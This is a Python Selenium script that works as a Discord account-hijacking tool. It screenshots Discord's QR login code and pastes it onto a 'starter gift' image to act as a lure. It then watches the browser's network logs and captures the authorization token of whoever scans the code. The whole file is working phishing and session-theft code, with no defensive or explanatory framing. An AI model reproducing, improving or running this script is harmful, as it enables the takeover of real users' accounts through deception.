from requests.api import request
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.keys import Keys
import time
from fake_useragent import UserAgent
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
import json, requests
import urllib, os
from PIL import Image

ua = UserAgent()

capabilities = DesiredCapabilities.CHROME
capabilities["goog:loggingPrefs"] = {"performance": "ALL"}  # chromedriver 75+

class Bot:
    def __init__(self):
        self.wd = webdriver.Chrome(ChromeDriverManager().install(), desired_capabilities=capabilities)
    def get_token(self):
        while True:
            logs = self.wd.get_log('performance')
            for i in logs:
                try:
                    if 'authorization' in str(i) and 'undefined' not in str(i):
                        message = json.loads(i['message'])
                        message = message['message']
                        params = message['params']
                        headers = params['headers']
                        authorization_token = headers['authorization']
                        return authorization_token 
                except Exception as e:
                    print(e)

            time.sleep(10)

    def get_qr(self):
        self.wd.get('https://discord.com/login')

        while True:
            try:
                qr_code_link = self.wd.find_element_by_class_name('qrCode-wG6ZgU')
                element = qr_code_link.find_element_by_css_selector('img')
                with open('qr.png', 'wb') as f:
                    f.write(element.screenshot_as_png)
                return
            except:
                print('again')
                time.sleep(3)
    def build_gift(self):
  
        img1 = Image.open("starter_gift.png")
        
        img2 = Image.open("qr.png")
        
        img1.paste(img2, (211,671))
        
        img1.save('result.png')

        #os.remove('qr.png')


bot = Bot()


bot.get_qr()

bot.build_gift()


token = bot.get_token()

print(token)

time.sleep(1000)


        
